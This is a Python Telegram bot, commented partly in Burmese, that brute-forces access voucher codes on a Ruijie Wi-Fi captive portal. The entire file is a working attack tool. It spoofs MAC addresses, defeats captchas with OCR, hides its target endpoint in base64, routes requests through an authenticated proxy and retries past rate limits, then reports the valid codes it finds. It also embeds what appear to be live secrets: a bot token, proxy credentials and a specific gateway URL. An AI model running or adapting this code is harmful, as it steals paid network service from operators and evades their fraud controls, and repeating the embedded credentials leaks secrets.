#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v7.2
#  Batch Success Codes Display
#  Commands:
#    /start        — ကြိုဆို + ညွှန်ကြား
#    /seturl <url> — Session URL ထည့်
#    /scan 6|7|8   — scan စတင် (6/7/8 လုံး)
#    /scan random  — random 8-digit infinite
#    /status       — stats ကြည့်
#    /stop         — scan ရပ်
#    /result       — တွေ့တဲ့ code တွေ ကြည့်
#    /batch <n>    — batch size သတ်မှတ် (default 10)
# ==============================================

import telebot, asyncio, aiohttp, base64, random, re, os, string, time
from telebot.async_telebot import AsyncTeleBot

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# =============================================
#  CONFIG
# =============================================
BOT_TOKEN = "8828606651:AAEx7R6Hv5Z90LaKPsh_6_Jg_LVwVZqeUo4"
ADMIN_ID  = "7047836664"
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C"
THREADS = 50

# =============================================
#  PROXY CONFIG
# =============================================
PROXY_USER = "M6P7QHMfqqZDlit"
PROXY_PASS = "cAoRtj357pse145"
PROXY_IP = "176.46.143.161"
PROXY_PORT = "43220"
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_IP}:{PROXY_PORT}"

# =============================================
#  BATCH DISPLAY CONFIG (အသစ်)
# =============================================
DEFAULT_BATCH_SIZE = 10          # တစ်ကြိမ်လျှင် codes အရေအတွက်
BATCH_FLUSH_INTERVAL = 15        # seconds (codes မပြည့်လျှင် ဤအချိန်တွင် ပြမည်)
MAX_MESSAGE_LENGTH = 3500        # Telegram message length ကန့်သတ်ချက်
# =============================================

bot = AsyncTeleBot(BOT_TOKEN)

# per-user state
user_sessions = {}   # chat_id -> {...}
_connector = None
_ocr = None

# =============================================
#  H4CK3R ENGINE — Network helpers
# =============================================
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True,
                            proxy=PROXY_URL, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous


# =============================================
#  H4CK3R ENGINE — Captcha
# =============================================
def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, proxy=PROXY_URL, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text},
        proxy=PROXY_URL, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None


# =============================================
#  H4CK3R ENGINE — Balance check
# =============================================
async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]
    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers,
                                 proxy=PROXY_URL, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"


# =============================================
#  H4CK3R ENGINE — Voucher POST
# =============================================
_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()


# =============================================
#  BATCH DISPLAY MANAGER (အသစ်)
# =============================================
class BatchDisplayManager:
    """
    Success codes များကို အစုလိုက် ပြသရန် စီမံခန့်ခွဲသည်။
    - Codes များကို buffer တွင် သိမ်းထားသည်
    - batch_size ပြည့်လျှင် သို့မဟုတ် flush_interval ရောက်လျှင် ပြသသည်
    - Edit-in-place ဖြင့် message spam လျော့ချသည်
    """
    def __init__(self, chat_id, batch_size=DEFAULT_BATCH_SIZE,
                 flush_interval=BATCH_FLUSH_INTERVAL):
        self.chat_id = chat_id
        self.batch_size = batch_size
        self.flush_interval = flush_interval

        self.buffer = []              # လက်ရှိ batch ထဲရှိ codes
        self.all_codes = []           # စုစုပေါင်း ရရှိသော codes
        self.message_id = None        # လက်ရှိ ပြသနေသော message
        self.last_flush = time.time()
        self.lock = asyncio.Lock()
        self.total_batches = 0

    async def add_code(self, code, info):
        """Code တစ်ခု ထည့်သည်။ Batch ပြည့်လျှင် ချက်ချင်း flush လုပ်သည်။"""
        async with self.lock:
            entry = f"🎫 <code>{code}</code>\n   └ {info}"
            self.buffer.append(entry)
            self.all_codes.append(f"{code} | {info}")

            if len(self.buffer) >= self.batch_size:
                await self._flush()
            elif time.time() - self.last_flush >= self.flush_interval:
                await self._flush()

    async def _flush(self):
        """Buffer ထဲရှိ codes များကို Telegram တွင် ပြသသည်။"""
        if not self.buffer:
            return

        self.total_batches += 1
        batch_num = self.total_batches
        batch_count = len(self.buffer)

        header = (
            f"🎉 <b>SUCCESS CODES — BATCH #{batch_num}</b>\n"
            f"📦 ဤ batch တွင်: <b>{batch_count}</b> codes\n"
            f"📊 စုစုပေါင်း: <b>{len(self.all_codes)}</b> codes\n"
            f"{'─' * 25}\n\n"
        )
        body = "\n\n".join(self.buffer)
        text = header + body

        # Message အရှည် ကန့်သတ်ချက် စစ်ဆေးခြင်း
        if len(text) > MAX_MESSAGE_LENGTH:
            # ရှိပြီးသား message ကို update လုပ်မည်
            try:
                if self.message_id:
                    await bot.edit_message_text(
                        text, self.chat_id, self.message_id, parse_mode="HTML"
                    )
                else:
                    sent = await bot.send_message(
                        self.chat_id, text, parse_mode="HTML"
                    )
                    self.message_id = sent.message_id
            except:
                pass
        else:
            # ရှိပြီးသား message ကို update လုပ်မည်
            try:
                if self.message_id:
                    await bot.edit_message_text(
                        text, self.chat_id, self.message_id, parse_mode="HTML"
                    )
                else:
                    sent = await bot.send_message(
                        self.chat_id, text, parse_mode="HTML"
                    )
                    self.message_id = sent.message_id
            except Exception as e:
                # Edit fail ဖြစ်လျှင် message အသစ် ပို့မည်
                try:
                    sent = await bot.send_message(
                        self.chat_id, text, parse_mode="HTML"
                    )
                    self.message_id = sent.message_id
                except:
                    pass

        # Buffer ရှင်းလင်းခြင်း
        self.buffer = []
        self.last_flush = time.time()

    async def flush_remaining(self):
        """Scan ပြီးဆုံးချိန်တွင် ကျန်ရှိသော codes များကို ပြသသည်။"""
        async with self.lock:
            if self.buffer:
                await self._flush()

    async def force_flush(self):
        """ချက်ချင်း flush လုပ်သည် (stop လုပ်ချိန်)။"""
        async with self.lock:
            await self._flush()


# =============================================
#  H4CK3R ENGINE — Core voucher check
# =============================================
async def perform_check(session_url, code, chat_id):
    session = user_sessions.get(chat_id)
    if not session:
        return
    stats = session.get("stats")
    if stats is None:
        return

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    try:
                        img = await Captcha_Image(sess, session_id)
                        text = await Captcha_Text(img)
                        if not text:
                            continue
                        verified = await Varify_Captcha(sess, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except:
                        pass

            if not auth_code:
                if not _HAS_OCR:
                    auth_code = ""
                else:
                    return

            if user_sessions.get(chat_id, {}).get("stop"):
                return

            payload = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers,
                                     proxy=PROXY_URL, ssl=False) as r:
                    response = await r.text()
            except:
                return

        if 'request limited' in response:
            stats["limits"] += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return

    stats["tried"] += 1
    stats["current_code"] = code

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        stats["hits"] += 1
        stats["hit_codes"].append(f"{code} | {info}")

        # Batch display manager သို့ ထည့်သည်
        batch_mgr = session.get("batch_mgr")
        if batch_mgr:
            await batch_mgr.add_code(code, info)
        else:
            # Fallback: တစ်ခုချင်း ပြသည်
            try:
                await bot.send_message(
                    chat_id,
                    f"✅ <b>Voucher Found!</b>\n\n"
                    f"<b>Code:</b> <code>{code}</code>\n"
                    f"<b>Info:</b> {info}",
                    parse_mode="HTML"
                )
            except:
                pass

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        stats["expired"] += 1
        # Limited codes များကို တစ်ခုချင်း မပြဘဲ stats တွင်သာ ရေတွက်သည်


# =============================================
#  CODE ITERATORS
# =============================================
def iter_range_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length):
    while True:
        yield "".join(random.choice(string.digits) for _ in range(length))


# =============================================
#  ASYNC SCAN RUNNER
# =============================================
async def run_scan(chat_id, session_url, start_code, end_code, workers, mode="range"):
    global _connector

    _init_ocr()

    if _connector is None or _connector.closed:
        _connector = aiohttp.TCPConnector(limit=workers + 200, ssl=False)

    sem = asyncio.Semaphore(workers)
    session = user_sessions[chat_id]
    stats = session["stats"]

    # Batch display manager ကို သတ်မှတ်သည်
    batch_size = session.get("batch_size", DEFAULT_BATCH_SIZE)
    batch_mgr = BatchDisplayManager(chat_id, batch_size=batch_size)
    session["batch_mgr"] = batch_mgr

    if mode == "random":
        code_iter = iter_random_codes(8)
    else:
        code_iter = iter_range_codes(start_code, end_code)

    # progress updater
    async def update_progress():
        msg_id = user_sessions[chat_id].get("progress_msg_id")
        while not user_sessions[chat_id]["stop"]:
            await asyncio.sleep(5)
            elapsed = time.time() - stats["start_time"]
            speed = stats["tried"] / elapsed if elapsed > 0 else 0
            text = (
                "⚡ <b>Scanner Running</b> ⚡\n\n"
                f"🔍 Tried: <b>{stats['tried']}</b>\n"
                f"🎯 Current: <code>{stats['current_code'] or '---'}</code>\n"
                f"🟢 Hits: <b>{stats['hits']}</b>\n"
                f"🔴 Expired: <b>{stats['expired']}</b>\n"
                f"🟣 Limits: <b>{stats['limits']}</b>\n"
                f"⚡ Speed: <b>{speed:.1f} c/s</b>\n"
                f"📦 Batch Size: <b>{batch_size}</b>"
            )
            try:
                if msg_id:
                    await bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
            except:
                pass

    asyncio.create_task(update_progress())

    # Batch auto-flush task (codes မပြည့်လျှင် အချိန်ပြည့်တွင် ပြရန်)
    async def auto_flush():
        while not user_sessions[chat_id]["stop"]:
            await asyncio.sleep(BATCH_FLUSH_INTERVAL)
            try:
                if batch_mgr.buffer:
                    await batch_mgr.force_flush()
            except:
                pass

    asyncio.create_task(auto_flush())

    try:
        while not user_sessions[chat_id]["stop"]:
            batch = []
            for _ in range(200):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with sem:
                    await perform_check(session_url, c, chat_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

    except asyncio.CancelledError:
        pass
    finally:
        user_sessions[chat_id]["stop"] = True

    # ကျန်ရှိသော codes များကို flush လုပ်သည်
    try:
        await batch_mgr.flush_remaining()
    except:
        pass

    # final summary
    elapsed = time.time() - stats["start_time"]
    hit_list = stats["hit_codes"]
    summary = (
        f"🏁 <b>Scan Finished</b>\n\n"
        f"⏱ Time: {elapsed:.1f}s\n"
        f"🔍 Tried: {stats['tried']}\n"
        f"🟢 Hits: {stats['hits']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"🟣 Limits: {stats['limits']}"
    )
    if hit_list:
        summary += f"\n\n📋 <b>Found Codes:</b> {len(hit_list)} codes\n"
        summary += "\n".join(f"• <code>{c.split(' | ')[0]}</code>" for c in hit_list[:30])
    try:
        await bot.send_message(chat_id, summary, parse_mode="HTML")
    except:
        pass


# =============================================
#  BOT COMMANDS
# =============================================
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    chat_id = message.chat.id
    await bot.reply_to(
        message,
        "🤖 <b>Ruijie Voucher Scanner Bot</b>\n\n"
        "📖 <b>Commands:</b>\n"
        "/seturl &lt;url&gt; — Session URL ထည့်\n"
        "/scan 6 — 6-digit scan (000000-999999)\n"
        "/scan 7 — 7-digit scan (0000000-9999999)\n"
        "/scan 8 — 8-digit scan\n"
        "/scan random — random 8-digit infinite\n"
        "/batch &lt;n&gt; — batch size သတ်မှတ် (default 10)\n"
        "/status — လက်ရှိ stats ကြည့်\n"
        "/stop — scan ရပ်\n"
        "/result — တွေ့တဲ့ code တွေ ကြည့်\n\n"
        "⚠️ အရင် /seturl နဲ့ URL ထည့်ပါ။\n"
        "🌐 Proxy: အားလုံး proxy ဖြင့် ချိတ်ဆက်ထားသည်။\n"
        "📦 Success codes များ အစုလိုက် ပြသပါမည်။",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['batch'])
async def cmd_batch(message):
    """Batch size သတ်မှတ်ရန်"""
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)

    if len(args) < 2:
        current = user_sessions.get(chat_id, {}).get("batch_size", DEFAULT_BATCH_SIZE)
        await bot.reply_to(
            message,
            f"📦 လက်ရှိ Batch Size: <b>{current}</b>\n\n"
            f"Usage: /batch &lt;n&gt;\n"
            f"ဥပမာ: /batch 20\n\n"
            f"• Codes {DEFAULT_BATCH_SIZE} ခု ပြည့်လျှင် ချက်ချင်း ပြမည်\n"
            f"• {BATCH_FLUSH_INTERVAL} စက္ကန့် ပြည့်လျှင် ကျန်ရှိသော codes များကို ပြမည်",
            parse_mode="HTML"
        )
        return

    try:
        size = int(args[1].strip())
        if size < 1 or size > 100:
            await bot.reply_to(message, "❌ Batch size သည် 1 မှ 100 အတွင်း ဖြစ်ရမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "❌ နံပါတ် ဖြစ်ရမည်။")
        return

    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"url": None, "task": None, "stop": True, "stats": {}}
    user_sessions[chat_id]["batch_size"] = size

    await bot.reply_to(
        message,
        f"✅ Batch Size သတ်မှတ်ပြီး: <b>{size}</b>\n\n"
        f"Codes {size} ခု ပြည့်လျှင် အစုလိုက် ပြသပါမည်။",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['seturl'])
async def cmd_seturl(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        url = TARGET_URL
    else:
        url = args[1].strip()

    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"url": None, "task": None, "stop": True, "stats": {}}
    user_sessions[chat_id]["url"] = url

    await bot.reply_to(
        message,
        f"✅ <b>Session URL သတ်မှတ်ပြီး</b>\n\n"
        f"<code>{url[:60]}...</code>\n\n"
        "ယခု /scan 6 သို့မဟုတ် /scan 7 သို့မဟုတ် /scan 8 နဲ့ scan စတင်ပါ။",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['scan'])
async def cmd_scan(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan 6\n/scan 7\n/scan 8\n/scan random"
        )
        return

    mode = args[1].strip().lower()

    if chat_id not in user_sessions or not user_sessions[chat_id].get("url"):
        await bot.reply_to(message, "❌ အရင် /seturl &lt;url&gt; နဲ့ Session URL ထည့်ပါ။")
        return

    task = user_sessions[chat_id].get("task")
    if task and not task.done():
        await bot.reply_to(message, "⚠️ scan က ဆက် run နေသေးပါ။ /stop နဲ့ ရပ်ပြီးမှ ပြန်စပါ။")
        return

    if mode == "6":
        start_code, end_code, smode = 0, 999999, "range"
        label = "6-digit (000000-999999)"
    elif mode == "7":
        start_code, end_code, smode = 0, 9999999, "range"
        label = "7-digit (0000000-9999999)"
    elif mode == "8":
        start_code, end_code, smode = 0, 99999999, "range"
        label = "8-digit (00000000-99999999)"
    elif mode == "random":
        start_code, end_code, smode = 0, 0, "random"
        label = "Random 8-digit (infinite)"
    else:
        await bot.reply_to(message, "❌ mode မှားပါ။ /scan 6, 7, 8, random ထဲက ရွေးပါ။")
        return

    batch_size = user_sessions[chat_id].get("batch_size", DEFAULT_BATCH_SIZE)

    user_sessions[chat_id]["stats"] = {
        "tried": 0,
        "hits": 0,
        "expired": 0,
        "limits": 0,
        "current_code": "",
        "hit_codes": [],
        "start_time": time.time()
    }
    user_sessions[chat_id]["stop"] = False

    progress_msg = await bot.send_message(
        chat_id,
        "⚡ <b>Scanner Running</b> ⚡\n\n"
        f"🎯 Mode: {label}\n"
        f"📦 Batch Size: {batch_size}\n"
        "🔍 Tried: 0\n"
        "🟢 Hits: 0\n"
        "🔴 Expired: 0\n"
        "🟣 Limits: 0\n"
        "⚡ Speed: 0 c/s",
        parse_mode="HTML"
    )
    user_sessions[chat_id]["progress_msg_id"] = progress_msg.message_id

    workers = THREADS
    url = user_sessions[chat_id]["url"]
    task = asyncio.create_task(
        run_scan(chat_id, url, start_code, end_code, workers, mode=smode)
    )
    user_sessions[chat_id]["task"] = task


@bot.message_handler(commands=['status'])
async def cmd_status(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats"):
        await bot.reply_to(message, "❌ scan မရှိသေးပါ။ /scan 6 နဲ့ စတင်ပါ။")
        return
    stats = s["stats"]
    elapsed = time.time() - stats["start_time"]
    speed = stats["tried"] / elapsed if elapsed > 0 else 0
    running = "🟢 Running" if not s["stop"] else "🔴 Stopped"
    batch_size = s.get("batch_size", DEFAULT_BATCH_SIZE)
    await bot.reply_to(
        message,
        f"📊 <b>Scan Status</b>  {running}\n\n"
        f"⏱ Time: {elapsed:.1f}s\n"
        f"🔍 Tried: {stats['tried']}\n"
        f"🎯 Current: <code>{stats['current_code'] or '---'}</code>\n"
        f"🟢 Hits: {stats['hits']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"🟣 Limits: {stats['limits']}\n"
        f"⚡ Speed: {speed:.1f} c/s\n"
        f"📦 Batch Size: {batch_size}",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s:
        await bot.reply_to(message, "❌ scan မရှိပါ။")
        return
    s["stop"] = True

    # ကျန်ရှိသော codes များကို flush လုပ်သည်
    batch_mgr = s.get("batch_mgr")
    if batch_mgr:
        try:
            await batch_mgr.flush_remaining()
        except:
            pass

    task = s.get("task")
    if task and not task.done():
        task.cancel()
    await bot.reply_to(message, "🛑 scan ရပ်တန်းပြီးပါ။")


@bot.message_handler(commands=['result'])
async def cmd_result(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats"):
        await bot.reply_to(message, "❌ မတွေ့သေးပါ။")
        return
    hit_list = s["stats"]["hit_codes"]
    if not hit_list:
        await bot.reply_to(message, "📋 တွေ့တဲ့ code မရှိသေးပါ။")
        return

    # အစုလိုက် ပြသခြင်း (10 codes per message)
    chunk_size = 20
    total = len(hit_list)

    await bot.reply_to(
        message,
        f"📋 <b>Found Codes</b> ({total} codes)\n"
        f"📦 {chunk_size} codes per message",
        parse_mode="HTML"
    )

    for i in range(0, total, chunk_size):
        chunk = hit_list[i:i + chunk_size]
        batch_num = (i // chunk_size) + 1
        total_batches = (total + chunk_size - 1) // chunk_size

        text = f"📦 <b>Batch {batch_num}/{total_batches}</b>\n"
        text += f"{'─' * 25}\n\n"

        for item in chunk:
            if " | " in item:
                code, info = item.split(" | ", 1)
                text += f"🎫 <code>{code}</code>\n   └ {info}\n\n"
            else:
                text += f"🎫 <code>{item}</code>\n\n"

        try:
            await bot.send_message(chat_id, text, parse_mode="HTML")
        except:
            # Message အရှည် လွန်းလျှင် ခွဲပို့သည်
            for item in chunk:
                try:
                    await bot.send_message(chat_id, f"🎫 <code>{item}</code>", parse_mode="HTML")
                except:
                    pass


# =============================================
#  MAIN
# =============================================
async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
    print("[*] Ruijie Scanner Bot starting...")
    print(f"[*] Proxy: {PROXY_IP}:{PROXY_PORT}")
    print(f"[*] Batch Size: {DEFAULT_BATCH_SIZE}")
    print(f"[*] Batch Flush Interval: {BATCH_FLUSH_INTERVAL}s")
    if not _HAS_OCR:
        print("[!] ddddocr မရှိပါ — pip install ddddocr opencv-python numpy")
    else:
        print("[*] Captcha solver: ddddocr ✓")
    try:
        await bot.infinity_polling(timeout=20, request_timeout=20)
    finally:
        await _connector.close()


if __name__ == '__main__':
    asyncio.run(main())